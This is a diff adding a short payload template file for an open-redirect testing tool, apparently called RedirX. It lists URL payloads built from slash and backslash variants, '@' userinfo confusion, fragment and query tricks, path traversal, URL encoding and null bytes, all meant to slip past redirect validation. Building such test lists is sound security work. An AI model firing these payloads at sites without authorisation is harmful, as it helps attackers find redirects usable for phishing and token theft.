@@ -1,0 +1,25 @@
+# RedirX Custom Payload Template File
+# Use {DOMAIN} for the configured test domain (e.g. example.com)
+# Use {TARGET} for the target hostname (e.g. target.com)
+
+https://{DOMAIN}
+http://{DOMAIN}
+//{DOMAIN}
+///{DOMAIN}
+////{DOMAIN}
+/\{DOMAIN}
+\/{DOMAIN}
+\\{DOMAIN}
+\\{DOMAIN}\
+https://{TARGET}@{DOMAIN}
+https://{TARGET}:{TARGET}@{DOMAIN}
+https://{DOMAIN}#@{TARGET}
+https://{DOMAIN}?@{TARGET}
+/../{DOMAIN}
+/%2e%2e/{DOMAIN}
+%2f%2f{DOMAIN}
+%68%74%74%70%73%3a%2f%2f{DOMAIN}
+%252f%252f{DOMAIN}
+https://{DOMAIN}%00
+https://{DOMAIN}/.
+
